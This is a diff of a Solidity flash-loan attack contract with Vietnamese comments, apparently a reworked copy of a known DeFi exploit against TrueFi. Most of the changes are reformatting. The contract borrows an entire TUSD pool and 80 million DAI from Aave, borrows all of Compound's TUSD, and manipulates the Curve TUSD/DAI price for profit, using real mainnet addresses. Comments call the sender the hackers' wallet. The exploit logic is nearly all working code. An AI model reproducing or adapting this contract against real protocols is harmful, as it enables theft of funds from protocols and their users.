@@ -42,7 +42,7 @@ interface CrvSwap {
 interface IYearn {
     function balance() external view returns (uint256);
 
-    function supplyAave(uint amount) external;
+    function supplyAave(uint256 amount) external;
 }
 
 contract Flashloan is FlashLoanReceiverBase {
@@ -67,11 +67,13 @@ contract Flashloan is FlashLoanReceiverBase {
     {
         adv = msg.sender; // addres ví của hackers
 
-        // Thiết lập các địa chỉ chính xác cho các loại tài sản
+        // Thiết lập đia chỉ các cho loại tài sản cần tương tác
         DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
         TUSD = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
         CTUSD = CTokenInterface(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
         CDAI = CTokenInterface(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
+
+        // Kết nối địa chỉ cho Comptroller
         Comptroller = ComptrollerInterface(
             0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
         );
@@ -99,21 +101,33 @@ contract Flashloan is FlashLoanReceiverBase {
 
         // Số lượng tài sản muốn với đối với từng loại
         uint256[] memory amounts = new uint256[](2);
-        amounts[0] = TUSD.balanceOf(0x101cc05f4A51C0319f570d5E146a8C625198e636); // kiểm tra trong pool TUSD có bao nhiêu sẽ vay hết
-        amounts[1] = 80000000 ether; // chỉ định muốn vay 80 triệu DAI
+
+        // kiểm tra trong pool TUSD có bao nhiêu sẽ vay hết
+        address aTUSD = 0x101cc05f4A51C0319f570d5E146a8C625198e636;
+        amounts[0] = TUSD.balanceOf(aTUSD);
+
+        // chỉ định muốn vay 80 triệu DAI
+        amounts[1] = 80000000 ether;
 
         // Thiết lập mode vay trực tiếp hay gián tiếp
         uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
         LENDING_POOL.flashLoan(
-            address(this), // - receiverAddress:    Địa chỉ nhận assets
-            assets, // - assets:             Các loại tài sản muốn vay
-            amounts, // - amounts:            Số lượng vay của từng tài sản
-            modes, // - modes:              Chế độ vay của từng tài sản
-            address(this), // - onBehalfOf:         Người chịu khoản nợ
-            "", // - params:             Các tham số sđược mã hóa dạng bytes-encoded để truyền vào thực thi trong hàm executeOperation() nếu có
-            0 // - referralCode:       Mã giới thiệu thường sử dụng cho bên thứ 3 nếu có
+            // - receiverAddress: Địa chỉ nhận assets
+            address(this),
+            // - assets: Các loại tài sản muốn vay
+            assets,
+            // - amounts: Số lượng vay của từng tài sản
+            amounts,
+            // - modes: Chế độ vay của từng tài sản
+            modes,
+            // - onBehalfOf: Người chịu khoản nợ
+            address(this),
+            // - params: các tham số truyền sang hàm executeOperation() nếu có
+            "",
+            // - referralCode: Mã giới thiệu thường sử dụng cho bên thứ 3 nếu có
+            0
         );
     }
 
@@ -128,44 +142,67 @@ contract Flashloan is FlashLoanReceiverBase {
         bytes calldata params
     ) external override returns (bool) {
         console.log("Đã nhận các tài sản vay Aave");
-        // Gửi DAI vào Compound Finance để lấy toàn bộ TUSD đang có sẵn về
+
+        // Gửi DAI vào Compound Finance để vay thêm TUSD
         borrowFromCompound();
+
         maximumTUSD = TUSD.balanceOf(address(this));
         console.log("Tổng số TUSD nhận được ->", maximumTUSD);
 
-        exploit(premiums[1] + 1 ether); // Truyền vào lượng phí DAI cần trả cho khoản vay DAI trên Aave là 0.09%
+        // Tiến hành thao túng và khai thác TrueFi
+        // premiums[1] là phí cần trả cho khoản vay
+        // DAI trên Aave là 0.09% cần phải để lại để
+        // sau có thể thanh toán Flash Loan
+        exploit(premiums[1] + 1 ether);
+
         console.log(
-            "Tổng TUSD sau khai thác ->",
+            "\nTổng TUSD sau khai thác ->",
             TUSD.balanceOf(address(this))
         );
 
         repayToCompound();
-        // Approve cho LendingPool của Aave để đến cuối transaction LendingPool sẽ tự kéo các tài sản và phí về
-        for (uint i = 0; i < assets.length; i++) {
-            uint amountOwing = amounts[i] + premiums[i];
+
+        // Ủy quyền các loại tài sản cho LendingPool
+        // có thể chuyển về khi transaction kết thúc
+        for (uint256 i = 0; i < assets.length; i++) {
+            uint256 amountOwing = amounts[i] + premiums[i];
             IERC20(assets[i]).safeApprove(address(LENDING_POOL), amountOwing);
         }
         return true;
     }
 
     function borrowFromCompound() internal {
-        // TUSD compound address - CTUSD = 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86
-        uint256 daiAmount = DAI.balanceOf(address(this)); // Balance đang có 80 triệu DAI
+        // Balance đang có 80 triệu DAI
+        uint256 daiAmount = DAI.balanceOf(address(this));
+
         console.log("Số lượng DAI hiện có sau khi vay từ Aave ->", daiAmount);
-        uint256 borrowAmount = CTUSD.getCash(); // Kiểm trả xem pool Compound có bao nhiêu TUSD
+
+        // Kiểm trả xem pool Compound có bao nhiêu TUSD
+        uint256 borrowAmount = CTUSD.getCash();
         DAI.safeApprove(address(CDAI), daiAmount);
-        CDAI.mint(daiAmount); // Gửi DAI vào pool Compound để nhận về cDAI bảo chứng cho khoản tiền gửi
-        CTUSD.borrow(borrowAmount); // Vay toàn bộ lượng TUSD đang có trong pool Compound
+
+        // Gửi DAI vào Compound để nhận về cDAI
+        // làm tài sản bảo chứng khoản DAI đã gửi
+        CDAI.mint(daiAmount);
+
+        // Vay toàn bộ lượng TUSD đang có trong pool Compound
+        CTUSD.borrow(borrowAmount);
         console.log("Số lượng TUSD đã vay được từ Compound ->", borrowAmount);
     }
 
     function repayToCompound() internal {
-        uint256 repayAmount = CTUSD.borrowBalanceCurrent(address(this)); // Kiểm tra khoản nợ cần thanh toán
+        // Kiểm tra khoản nợ cần thanh toán
+        uint256 repayAmount = CTUSD.borrowBalanceCurrent(address(this));
+
+        // Thanh toán khoản vay TUSD trên Compound Finance
         TUSD.approve(address(CTUSD), repayAmount);
-        CTUSD.repayBorrow(repayAmount); // Thanh toán khoản vay TUSD trên Compound Finance
+        CTUSD.repayBorrow(repayAmount);
+
+        // Tiến hành rút DAI khỏi Compound để
+        // thanh toán khoán vay Flash Loan trên Aave
         uint256 cdaiAmount = CDAI.balanceOf(address(this));
         CDAI.approve(address(CDAI), cdaiAmount);
-        CDAI.redeem(cdaiAmount); // Tiến hành rút DAI khỏi Compound để thanh toán khoán vay Flash Loan trên Aave
+        CDAI.redeem(cdaiAmount);
     }
 
     function exploit(uint256 daiPremium) internal {
@@ -180,7 +217,7 @@ contract Flashloan is FlashLoanReceiverBase {
         TUSD.approve(address(swap), totalAmount);
 
         console.log(
-            "Giá TUSD/DAI trước thao túng ->",
+            "\n- Giá TUSD/DAI trước thao túng ->",
             swap.get_dx_underlying(0, 3, 1 ether)
         );
 
@@ -207,7 +244,7 @@ contract Flashloan is FlashLoanReceiverBase {
          */
 
         console.log(
-            "Giá TUSD/DAI sau thao túng ->",
+            "\n- Giá TUSD/DAI sau thao túng ->",
             swap.get_dx_underlying(0, 3, 1 ether)
         );
 
@@ -239,7 +276,7 @@ contract Flashloan is FlashLoanReceiverBase {
         swap.exchange_underlying(2, 3, tether_amount, 0);
 
         console.log(
-            "Giá TUSD/DAI sau khi được cân bằng ->",
+            "\n- Giá TUSD/DAI sau khi được cân bằng ->",
             swap.get_dx_underlying(0, 3, 1 ether)
         );
 
